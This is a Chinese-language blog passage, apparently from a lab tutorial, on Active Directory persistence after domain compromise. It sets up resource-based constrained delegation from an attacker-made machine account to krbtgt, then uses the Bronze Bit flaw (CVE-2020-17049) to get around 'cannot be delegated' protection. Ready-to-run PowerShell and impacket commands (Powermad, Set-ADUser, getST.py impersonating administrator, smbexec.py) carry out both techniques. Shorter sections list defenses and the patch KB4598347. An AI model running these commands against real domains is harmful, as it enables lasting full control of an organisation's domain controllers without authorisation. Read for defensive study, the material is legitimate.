当拿到域控后，需要做权限维持，假设服务 B 为 krbtgt，服务 A 为我们控制的一个账号。配置服务 A 到服务 B 的基于资源的约束性委派， 那么我们控制的账户就可以获取 KDC (Key Distribution Centre) 服务的 ST 服务票据（也就是 TGT 认购权证）。于是我们就可以伪造任何权限用户的 TGT 认购权证，就相当于打造了一个变种的黄金票据。

利用 [Powermad.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1) 脚本新建一个密码为 test3 的机器账号，密码为 test

```powershell
Import-Module .\Powermad.ps1

New-MachineAccount -MachineAccount test3 -Password $(ConvertTo-SecureString "test" -AsPlainText -Force)
```

再配置 test3 到 krbtgt 的基于资源的约束性委派

```powershell
# 配置
Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount test3$

# 查询
Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount
```

![image-20220222201926278](https://oss.zjun.info/zjun.info/202202222019508.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

配置完成后，不管域管用户密码如何改变，我们都对该域有完全的控制权限。

```bash
sudo python3 getST.py -dc-ip 172.16.86.136 -spn krbtgt -impersonate administrator zjun.com/test3\$:test

export KRB5CCNAME=administrator.ccache

python3 smbexec.py -no-pass -k administrator@P-DC.zjun.com -dc-ip 172.16.86.136
```

![image-20220222202531853](https://oss.zjun.info/zjun.info/202202222025067.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

## 域委派攻击的防范措施

* 高权限的用户，设置不能被委派
* 主机账号需设置委派时，只能设置为约束性委派
* Windows 2012 R2 及更高的系统建立了受保护的用户组，组内用户不允许被委派，这是有效的手段。受保护的用户组， 当这个组内的用户登录时（windows 2012 R2 域服务器，客户端必须为 Windows 8.1 或之上）不能使用 NTLM 认证；Kerberos 预认证时不能使用 DES 或者 RC4 等加密算法

这样设置看起来可能安全了一些，但是也存在绕过。利用 Kerberos Bronze Bit (CVE-2020-17049) 这个逻辑漏洞实现。

KDC 对约束性委派和基于资源的约束性委派 (RBCD) 校验过程中对于通过 S4U2Self 请求的服务票据的验证过程如下：

KDC 首先会检查通过 S4U2Self 请求，请求的票据的 forwardable 标志位

* 如果该位为 0，也就是不可转发，那么就会再验证是否是 RBCD
  * 如果不是 RBCD，则不返回票据
  * 如果是 RBCD，则再检查被委派的用户是否设置了不能被委派
    * 如果设置了，则不返回票据
    * 如果没设置，则返回票据
* 如果该位为 1，也就是可转发，那么就会再验证两者之间是否有委派配置
  * 如果两者有委派配置，则返回票据
  * 如果两者无委派配置，则不返回票据

CVE-2020-17049 这个漏洞就是利用这一点，请求过程中手动修改请求的票据的 forwardable 标志位为 1，从而绕过检查进行攻击。

如下域控中 administrator 用户设置「敏感用户，不能被委派」

![image-20220222203414115](https://oss.zjun.info/zjun.info/202202222034055.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

如果现在按照之前的命令去设置基于资源的约束性委派，就会不成功

![image-20220222204823691](https://oss.zjun.info/zjun.info/202202222048997.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

`getST.py` 中有个 `-force-forwardable` 参数可以利用 CVE-2020-17049 漏洞来进行攻击。如下图成功获得 administrator 的 ST 服务票据

```bash
sudo python3 getST.py -dc-ip 172.16.86.136 -spn krbtgt -impersonate administrator zjun.com/test3\$:test -force-forwardable
```

![image-20220222205137204](https://oss.zjun.info/zjun.info/202202222051843.png?x-oss-process=image/watermark,size_20,text_emp1bnx6anVuLmluZm8=,color_AAAAAA)

要避免该问题还需要在此基础上打上 CVE-2020-17049 的漏洞补丁，补丁编号是：KB4598347，添加了一个票据签名，进行防篡改。

补丁地址：<https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-17049>

## 参考

* <https://www.bilibili.com/video/BV1564y1Y7HF>
* <https://mp.weixin.qq.com/s/yqiqiY6fMd9gLokDYM4vRw>
* <https://www.freebuf.com/articles/network/290860.html>
* <https://docs.microsoft.com/zh-cn/windows-server/security/kerberos/kerberos-constrained-delegation-overview>
* <https://y4er.com/post/kerberos-unconstrained-delegation/>
* <https://shanfenglan.blog.csdn.net/article/details/108777247>
* <https://daiker.gitbook.io/windows-protocol/kerberos/2>
* <https://shanfenglan.blog.csdn.net/article/details/110633298>
* <https://mp.weixin.qq.com/s/JQNwQH6eJ2L04jz60M8hiw>
* <https://xz.aliyun.com/t/7217>
* <https://www.cnblogs.com/mrhonest/p/14306539.html>
* <https://blog.csdn.net/blue_fantasy/article/details/122601984>
* <https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13>
* <https://docs.microsoft.com/zh-cn/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a>
* <https://xz.aliyun.com/t/7454>
* <https://y4er.com/post/kerberos-constrained-delegation/>
* <https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>
* <https://y4er.com/post/kerberos-resource-based-constrained-delegation/>
* <https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw>
